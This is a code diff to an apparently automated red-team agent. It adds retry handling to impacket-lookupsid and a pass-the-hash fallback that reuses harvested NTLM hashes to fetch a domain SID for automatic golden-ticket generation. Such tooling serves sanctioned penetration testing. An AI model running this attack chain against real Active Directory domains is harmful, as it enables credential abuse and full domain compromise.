@@ -19,6 +19,12 @@ import rigging as rg
 from dreadnode.agent import Agent, Thread
 from dreadnode.agent.stop import tool_use
 from loguru import logger
+from tenacity import (
+    retry,
+    retry_if_exception_type,
+    stop_after_attempt,
+    wait_random_exponential,
+)
 
 from ares.core.config import (
     get_agent_config,
@@ -2920,6 +2926,89 @@ async def _auto_local_admin_secretsdump(
             await asyncio.sleep(check_interval)
 
 
+class TransientToolError(Exception):
+    """Raised when a tool fails due to transient infrastructure issues (Redis timeout, network)."""
+
+
+def _is_transient_tool_error(stderr: str, return_code: int) -> bool:
+    """Check if a tool error is transient and worth retrying.
+
+    Transient errors include Redis timeouts, network issues, and cases where
+    the command didn't execute at all. Permanent errors include authentication
+    failures and actual tool output that doesn't contain expected data.
+
+    Args:
+        stderr: Standard error output from the tool
+        return_code: Exit code from the tool
+
+    Returns:
+        True if the error appears transient and should be retried
+    """
+    # Redis/network errors are transient
+    transient_patterns = [
+        "timeout reading from redis",
+        "connectionerror",
+        "connection refused",
+        "name or service not known",
+        "network is unreachable",
+        "timed out",
+        "connection reset",
+        "broken pipe",
+        "no route to host",
+    ]
+    stderr_lower = stderr.lower()
+    for pattern in transient_patterns:
+        if pattern in stderr_lower:
+            return True
+
+    # Empty stderr with non-zero exit often means command didn't execute
+    # (infrastructure failure before tool could run)
+    return bool(return_code != 0 and not stderr.strip())
+
+
+def _run_lookupsid_with_retry(
+    cmd: list[str],
+    timeout_seconds: int = 60,
+    max_attempts: int = 3,
+) -> tuple[str, str, int]:
+    """Run impacket-lookupsid with retry on transient errors.
+
+    Uses exponential backoff with jitter to handle Redis timeouts and
+    network issues gracefully. Only retries transient errors - permanent
+    failures (auth errors, etc.) fail immediately.
+
+    Args:
+        cmd: The lookupsid command to execute
+        timeout_seconds: Timeout for each attempt
+        max_attempts: Maximum number of retry attempts
+
+    Returns:
+        Tuple of (stdout, stderr, return_code)
+
+    Raises:
+        TransientToolError: If all retries exhausted due to transient errors
+    """
+    from ares.tools.red.common import run_tool
+
+    @retry(
+        stop=stop_after_attempt(max_attempts),
+        wait=wait_random_exponential(multiplier=1, max=30),
+        retry=retry_if_exception_type(TransientToolError),
+        reraise=True,
+    )
+    def _execute() -> tuple[str, str, int]:
+        stdout, stderr, return_code = run_tool(cmd, timeout_seconds=timeout_seconds)
+
+        if return_code != 0 and _is_transient_tool_error(stderr, return_code):
+            err_preview = stderr[:150] if stderr else "empty stderr"
+            logger.warning(f"🎫 Transient lookupsid error (will retry): {err_preview}")
+            raise TransientToolError(f"Transient error: {stderr[:200] if stderr else 'no output'}")
+
+        return stdout, stderr, return_code
+
+    return _execute()
+
+
 async def _auto_golden_ticket(
     dispatcher: RedTeamDispatcher,
     check_interval: float = 30.0,
@@ -2987,23 +3076,48 @@ async def _auto_golden_ticket(
                     "attempting to generate golden ticket"
                 )
 
-                # Need a credential to run lookupsid
+                # Need a credential or hash to run lookupsid
+                # First try password credential, then fall back to hash-based auth
                 cred = None
+                auth_hash = None
+
+                # Try to find password credential for this domain first
                 for c in state.all_credentials:
                     if c.password and c.domain and c.domain.lower() == domain.lower():
                         cred = c
                         break
 
                 if not cred:
-                    # Try any credential
+                    # Try any password credential
                     for c in state.all_credentials:
                         if c.password:
                             cred = c
                             break
 
                 if not cred:
+                    # No password credential - try hash-based auth
+                    # Look for any NTLM hash we can use (prefer same domain, exclude krbtgt)
+                    for h in state.all_hashes:
+                        if h.hash_type.lower() != "ntlm":
+                            continue
+                        # Skip krbtgt - it's a service account, use a user account
+                        if h.username.lower() == "krbtgt":
+                            continue
+                        # Prefer same domain
+                        if h.domain and h.domain.lower() == domain.lower():
+                            auth_hash = h
+                            break
+
+                    if not auth_hash:
+                        # Try any NTLM hash (cross-domain auth may work)
+                        for h in state.all_hashes:
+                            if h.hash_type.lower() == "ntlm" and h.username.lower() != "krbtgt":
+                                auth_hash = h
+                                break
+
+                if not cred and not auth_hash:
                     logger.warning(
-                        f"🎫 Auto-golden-ticket: No password credential available for SID lookup "
+                        f"🎫 Auto-golden-ticket: No password or hash credential available for SID lookup "
                         f"in {domain}, skipping golden ticket (will retry)"
                     )
                     continue
@@ -3027,20 +3141,63 @@ async def _auto_golden_ticket(
                     processed_domains.add(domain.lower())
                     continue
 
-                # Run lookupsid to get domain SID
+                # Run lookupsid to get domain SID (with retry for transient errors)
                 try:
+                    from tenacity import RetryError
+
                     from ares.tools.red.common import run_tool
 
-                    cmd = [
-                        "impacket-lookupsid",
-                        f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
-                    ]
-                    stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
+                    if cred:
+                        # Password-based auth
+                        cmd = [
+                            "impacket-lookupsid",
+                            f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
+                        ]
+                        logger.info(
+                            f"🎫 Auto-golden-ticket: Running lookupsid with password for "
+                            f"{cred.domain}\\{cred.username}"
+                        )
+                    else:
+                        # Hash-based auth (pass-the-hash)
+                        # Format: domain/user@target -hashes LMHASH:NTHASH
+                        # Extract just the NT hash if full LM:NT format
+                        # Note: auth_hash is guaranteed non-None here because we checked
+                        # `if not cred and not auth_hash: continue` above
+                        assert auth_hash is not None  # noqa: S101
+                        nt_hash = auth_hash.hash_value
+                        if ":" in nt_hash:
+                            nt_hash = nt_hash.split(":")[-1]
+                        cmd = [
+                            "impacket-lookupsid",
+                            f"{auth_hash.domain}/{auth_hash.username}@{dc_ip}",
+                            "-hashes",
+                            f":{nt_hash}",  # Empty LM hash, just NT hash
+                        ]
+                        logger.info(
+                            f"🎫 Auto-golden-ticket: Running lookupsid with hash (PTH) for "
+                            f"{auth_hash.domain}\\{auth_hash.username}"
+                        )
+
+                    # Use retry wrapper for lookupsid - handles Redis timeouts gracefully
+                    try:
+                        stdout, stderr, _ = _run_lookupsid_with_retry(cmd, timeout_seconds=60)
+                    except (TransientToolError, RetryError) as e:
+                        # All retries exhausted due to transient errors (Redis timeout, network)
+                        # Don't mark as permanently failed - allow retry on next check interval
+                        logger.warning(
+                            f"🎫 Auto-golden-ticket: Transient errors for {domain} after retries, "
+                            f"will retry next interval: {e}"
+                        )
+                        # Don't add to processed_domains - allow retry on next iteration
+                        continue
+
                     output = stdout + "\n" + (stderr or "")
 
                     # Parse domain SID from output
                     sid_match = re.search(r"Domain SID is:\s*(S-\d+-\d+-\d+-\d+-\d+-\d+)", output)
                     if not sid_match:
+                        # Lookupsid ran but couldn't extract SID - this is a permanent failure
+                        # (bad creds, wrong domain, etc.)
                         logger.warning(
                             f"🎫 Auto-golden-ticket: Could not extract domain SID for {domain}"
                         )
@@ -3050,6 +3207,9 @@ async def _auto_golden_ticket(
                                 "ticket_path": None,
                                 "created_at": datetime.now(timezone.utc).isoformat(),
                                 "status": "failed_no_sid",
+                                "error": output[:500]
+                                if output.strip()
+                                else "No output from lookupsid",
                             }
                         )
                         # Update processed_domains to prevent duplicate attempts in this iteration
